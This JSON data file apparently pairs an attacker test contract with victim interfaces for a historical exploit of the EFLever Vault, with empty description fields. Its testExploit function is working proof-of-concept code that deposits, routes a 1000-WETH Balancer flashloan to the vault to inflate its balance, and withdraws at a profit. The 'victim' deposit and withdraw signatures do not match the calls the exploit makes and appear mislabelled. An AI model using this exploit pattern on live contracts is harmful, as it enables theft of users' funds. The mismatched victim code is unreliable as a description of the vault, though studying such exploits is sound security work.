[
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "IS_TEST",
    "original_code": "",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "excludeArtifacts",
    "original_code": "    function excludeArtifacts() public view returns (string[] memory excludedArtifacts_) {\n        excludedArtifacts_ = _excludedArtifacts;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "excludeContracts",
    "original_code": "    function excludeContracts() public view returns (address[] memory excludedContracts_) {\n        excludedContracts_ = _excludedContracts;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "excludeSenders",
    "original_code": "    function excludeSenders() public view returns (address[] memory excludedSenders_) {\n        excludedSenders_ = _excludedSenders;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "failed",
    "original_code": "    function failed() public view returns (bool) {\n        if (_failed) {\n            return _failed;\n        } else {\n            return vm.load(address(vm), bytes32(\"failed\")) != bytes32(0);\n        }\n",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "setUp",
    "original_code": "    function setUp() public {\n        vm.createSelectFork(\"mainnet\", 15_746_199);\n        // Adding labels to improve stack traces' readability\n        vm.label(address(WETH_TOKEN), \"WETH_TOKEN\");\n        vm.label(address(EFLEVER_VAULT), \"EFLEVER_VAULT\");\n        vm.label(address(BALANCER_VAULT), \"BALANCER_VAULT\");\n        vm.label(0xBAe7EC1BAaAe7d5801ad41691A2175Aa11bcba19, \"EF_LEVER_TOKEN\");\n        vm.label(0x071108Ad85d7a766B41E0f5e5195537A8FC8E74D, \"EF_LEVER_UNVERIFIED_SAFEMATH\");\n        vm.label(0x030bA81f1c18d280636F32af80b9AAd02Cf0854e, \"aWETH_TOKEN\");\n        vm.label(0xae7ab96520DE3A18E5e111B5EaAb095312D7fE84, \"stETH_TOKEN\");\n        vm.label(0x1982b2F5814301d4e9a8b0201555376e62F82428, \"aSTETH_TOKEN\");\n        vm.label(0xF63B34710400CAd3e044cFfDcAb00a0f32E33eCf, \"variableDebtWETH_TOKEN\");\n        vm.label(0xA50ba011c48153De246E5192C8f9258A2ba79Ca9, \"AAVE_ORACLE\");\n        vm.label(0x7d2768dE32b0b80b7a3454c06BdAc94A69DDc7A9, \"AAVE_LENDING_POOL_V2\");\n        vm.label(0xDC24316b9AE028F1497c275EB9192a3Ea0f67022, \"CURVE_stETH_POOL\");\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "targetArtifactSelectors",
    "original_code": "    function targetArtifactSelectors() public view returns (FuzzSelector[] memory targetedArtifactSelectors_) {\n        targetedArtifactSelectors_ = _targetedArtifactSelectors;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "targetArtifacts",
    "original_code": "    function targetArtifacts() public view returns (string[] memory targetedArtifacts_) {\n        targetedArtifacts_ = _targetedArtifacts;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "targetContracts",
    "original_code": "    function targetContracts() public view returns (address[] memory targetedContracts_) {\n        targetedContracts_ = _targetedContracts;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "targetInterfaces",
    "original_code": "    function targetInterfaces() public view returns (FuzzInterface[] memory targetedInterfaces_) {\n        targetedInterfaces_ = _targetedInterfaces;\n    }\n",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "targetSelectors",
    "original_code": "    function targetSelectors() public view returns (FuzzSelector[] memory targetedSelectors_) {\n        targetedSelectors_ = _targetedSelectors;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "targetSenders",
    "original_code": "    function targetSenders() public view returns (address[] memory targetedSenders_) {\n        targetedSenders_ = _targetedSenders;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "testExploit",
    "original_code": "    function testExploit() public {\n        emit log_named_decimal_uint(\n            \"[Start] Attacker WETH balance before exploit\", WETH_TOKEN.balanceOf(address(this)), 18\n        );\n        uint256 ethBalanceBefore = address(this).balance;\n\n        // Deposit 0.1 ETH into the EFLever Vault\n        EFLEVER_VAULT.deposit{value: 1e17}(1e17);\n\n        emit log_named_decimal_uint(\n            \"\\n\\tBefore flashloan, ETH balance in EFLeverVault\", address(EFLEVER_VAULT).balance, 18\n        );\n        // Flashloan to manipulate contract's balance\n        address[] memory tokens = new address[](1);\n        tokens[0] = address(WETH_TOKEN);\n        uint256[] memory amounts = new uint256[](1);\n        amounts[0] = 1000 * 1e18;\n        bytes memory userData = \"0x2\";\n        BALANCER_VAULT.flashLoan(address(EFLEVER_VAULT), tokens, amounts, userData);\n        emit log_named_decimal_uint(\n            \"\\tAfter flashloan, ETH balance in EFLeverVault\", address(EFLEVER_VAULT).balance, 18\n        );\n        EFLEVER_VAULT.withdraw(9e16);\n        emit log_named_decimal_uint(\"\\tAfter withdraw, ETH balance in EFLeverVault\", address(EFLEVER_VAULT).balance, 18);\n\n        // Swap the profit in ETH to WETH\n        uint256 ethProfit = address(this).balance - ethBalanceBefore;\n        WETH_TOKEN.deposit{value: ethProfit}();\n\n        emit log_named_decimal_uint(\n            \"\\n[End] Attacker WETH balance after exploit\", WETH_TOKEN.balanceOf(address(this)), 18\n        );\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "IEFLeverVault",
    "source_type": "victim_contract",
    "function_name": "deposit",
    "original_code": "    function deposit(\n        address asset,\n        uint256 amount,\n        address onBehalfOf,\n        uint16 referralCode\n    ) external;\n\n",
    "description": ""
  },
  {
    "contract/interface": "IEFLeverVault",
    "source_type": "victim_contract",
    "function_name": "withdraw",
    "original_code": "    function withdraw(\n        address asset,\n        uint256 amount,\n        address to\n    ) external returns (uint256);\n\n",
    "description": ""
  }
]